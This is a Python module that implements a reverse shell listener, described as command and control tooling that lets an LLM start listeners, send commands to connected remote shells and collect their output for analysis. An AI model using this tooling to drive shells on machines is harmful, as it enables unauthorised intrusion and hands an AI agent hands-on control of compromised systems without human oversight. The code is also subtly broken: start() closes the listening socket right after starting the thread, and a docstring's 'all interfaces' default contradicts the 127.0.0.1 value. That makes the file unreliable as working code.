"""
Command and control utility to power LLM client.

This module provides a reverse shell client implementation that allows an LLM
control and interact with remote shells.
It handles starting/stopping listeners,
sending commands, and managing shell sessions.
"""
import socket
import sys
import threading


class ReverseShellClient:
    """
    A reverse shell client that runs in the background and allows the LLM to:
    - Start/stop listeners
    - Send commands to connected shells
    - Access command history and output
    - Handle multiple shell sessions

    The shells run in the background (second plane) while allowing the LLM to:
    - Compare and analyze command outputs
    - Chain commands across sessions
    - Monitor shell status
    """

    def __init__(self, host='127.0.0.1', port=4444):
        """
        Initialize reverse shell client
        Args:
            host: Listener host IP, defaults to all interfaces
            port: Listener port number, defaults to 4444
        """
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.running = False
        self.listener_thread = None
        self.command_history = []
        self.client_socket = None

    def handle_client(self, client_socket):
        """
        Handle incoming client connection in background thread
        Args:
            client_socket: Connected client socket
        """
        self.client_socket = client_socket
        while True:
            try:
                data = client_socket.recv(4096)
                if not data:
                    break
                decoded_data = data.decode()
                self.command_history.append(decoded_data)
                sys.stdout.write(decoded_data)
                sys.stdout.flush()
            except (OSError, UnicodeDecodeError):
                break
        client_socket.close()
        self.client_socket = None

    def start_listener(self):
        """Start listener thread in background"""
        self.running = True
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(1)
            while self.running:
                client_socket, _ = self.socket.accept()
                client_handler = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket,)
                )
                client_handler.daemon = True
                client_handler.start()
        except OSError as e:
            print(f"Error in listener: {str(e)}")
        finally:
            if not self.running:
                self.socket.close()

    def start(self):
        """
        Start the reverse shell listener in background thread
        Returns:
            str: Status message with connection details
        """
        self.listener_thread = threading.Thread(target=self.start_listener)
        self.listener_thread.daemon = True
        self.listener_thread.start()
        self.socket.close()
        return f'Listener started on {self.host}:{self.port}'

    def stop(self):
        """
        Stop the reverse shell listener
        Returns:
            dict: Status message
            dict: Status including host and port
        """
        self.running = False
        if self.client_socket:
            self.client_socket.close()
        self.socket.close()
        return {"status": "Listener stopped"}

    def send_command(self, command: str):
        """
        Send a command to the connected reverse shell
        The command runs in background and output can be retrieved from history
        Args:
            command: Command to execute on target
        Returns:
            dict: Status of command execution
        """
        if not self.client_socket:
            return {"status": "error", "message": "No client connected"}
        try:
            self.client_socket.send(f"{command}\n".encode())
            return {"status": "success", "message": "Command sent"}
        except OSError as e:
            return {"status": "error", "message": str(e)}

    def show_session(self):
        """
        Show the current session status
        Returns:
            dict: Session status including host and port
        """
        return {"host": self.host, "port": self.port}

    def get_history(self):
        """
        Get command history and output for LLM analysis
        Returns:
            dict: History of commands and outputs, connection status
        """
        connected = "Connected" if self.client_socket else "Not connected"
        return {
            "history": self.command_history,
            "host": self.host,
            "port": self.port,
            "status": connected
        }
